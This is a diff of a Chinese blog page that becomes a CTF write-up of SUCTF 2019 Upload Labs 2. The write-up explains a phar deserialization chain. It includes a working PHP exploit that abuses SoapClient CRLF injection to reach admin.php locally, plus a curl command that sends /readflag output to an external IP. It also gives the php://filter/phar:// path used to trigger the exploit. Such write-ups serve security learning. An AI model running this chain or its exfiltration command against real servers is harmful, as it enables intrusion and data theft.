@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
   <head>
       <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>过客</title>
+  <title>[SUCTF 2019]Upload Labs 2(phar反序列化) | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[SUCTF 2019]Upload Labs 2(phar反序列化) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,9 +25,15 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="[SUCTF 2019]Upload Labs 2(phar反序列化)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/-05AEB0Yn/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
-     <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
       <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
@@ -65,75 +71,108 @@
       </div>
     </div>
   </nav>
+  <!-- Page Header -->
   <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <div class="site-heading">
-            <h1>过客</h1>
-            <span class="subheading">this is a test Web</span>
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>[SUCTF 2019]Upload Labs 2(phar反序列化)</h1>
+            <span class="meta">
+            	Posted on
+              2020-04-23，3 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
-      <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-md-10 mx-auto">
-       
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/cve-2019-0193apache-solr-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/">
-            <h2 class="post-title">
-              CVE-2019-0193:Apache Solr远程命令执行漏洞复现
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>影响范围</strong><br>
-Apache Solr &lt; 8.2.0</p>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/">
-            <h2 class="post-title">
-              利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>从github上。下源码。admin.php有修改<br>
+首先就一个文件上传。和判断文件类型。<br>
+文件上传部分。已经定死了后缀名。只能是gif。jpg等<br>
+判断文件类型处。禁用了</p>
+<pre><code>ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'
+</code></pre>
+<p>然后用finfo_file去判断文件类型<br>
+这里很明显存在一个phar反序列化的点。<br>
+去class.php看看<br>
+<img src="https://guokeya.github.io/post-images/1587624335954.png" alt="" loading="lazy"><br>
+可以看到。这里存在魔术方法__wakeup。可以创建任意类。<br>
+admin.php是关键<br>
+<img src="https://guokeya.github.io/post-images/1587624392569.png" alt="" loading="lazy"><br>
+有个可控的<code>$cmd</code>可以执行命令。但是得本地访问<br>
+那么大致思路就是。通过class.php的魔术方法。构造SOAP+CLRF。对admin.php任意命令执行<br>
+admin.php中还有一大串反射有关的函数<br>
+函数参考<code>https://www.php.net/manual/zh/reflectionmethod.invoke.php</code></p>
+<pre><code>    function check(){
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">4 min read</span>
-            </p>
+        $reflect = new ReflectionClass($this-&gt;clazz);
+        $this-&gt;instance = $reflect-&gt;newInstanceArgs();
+
+        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);
+        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1);
+
+        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);
+        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2);
+
+        $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);
+        $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3);
+    }
+</code></pre>
+<p>如果这里过不去。报错了。就不能执行cmd<br>
+这里用SplStack函数构造。ReflectionMethod创建SplStack类。然后执行<code>$this-&gt;func1</code>的函数,<code>$this-&gt;arg1</code>为参数。<br>
+下面直接放exp</p>
+<pre><code>&lt;?php
+class File{
+	public $file_name;
+	public $func=&quot;SoapClient&quot;;
+	public function __construct(){
+		$payload='admin=1&amp;cmd=curl &quot;http://174.0.134.167:888/?a=`/readflag`&quot;&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=123456';
+		$this-&gt;file_name=[null,array('location'=&gt;'http://127.0.0.1/admin.php','user_agent'=&gt;&quot;xxx\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;.strlen($payload).&quot;\r\n\r\n&quot;.$payload,'uri'=&gt;'abc')];
+	}	
+}
+$a=new File();
+@unlink(&quot;phar.phar&quot;);
+$phar=new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering(); 
+$phar-&gt;setStub('GIF89a'.'&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;');
+$phar-&gt;setMetadata($a); 
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+$phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<p>没啥东西。class.php中限制了上传文件不能出现<code>&lt;?</code>。而在构造phar时有个setStub参数就会出现<code>&lt;?php __HALT_COMPILER();?&gt;</code>。这里用script标签绕过<br>
+其他就没什么了。SOAP+CRLF<br>
+了解下ReflectionClass函数以及newInstanceArgs函数具体是咋回事就行了<br>
+传上去后。用<code>php://filter/resource=phar://upload/48cd8b43081896fbd0931d204f947663/18e2999891374a475d0687ca9f989d83.jpg</code>绕过前缀限制。触发phar反序列化<br>
+<img src="https://guokeya.github.io/post-images/1587625103827.png" alt="" loading="lazy"></p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/XxOKeal9U/">
+              <span class="post-title">
+                NPUCTF 验证🐎 （JS弱类型+原型链）&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
         </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        
-        <a class="btn btn-primary float-left" href="https://guokeya.github.io/page/13/">&larr; 上一页</a>
-        
-        
       </div>
     </div>
-  </div>
-
-  
-    <!-- Footer -->
+  </article>
+ <!-- Footer -->
   <footer>
     <div class="container">
       <div class="row">
@@ -204,3 +243,4 @@ php未禁用putenv，mail函数</p>
   })(this));</script>
   </body>
 </html>
+
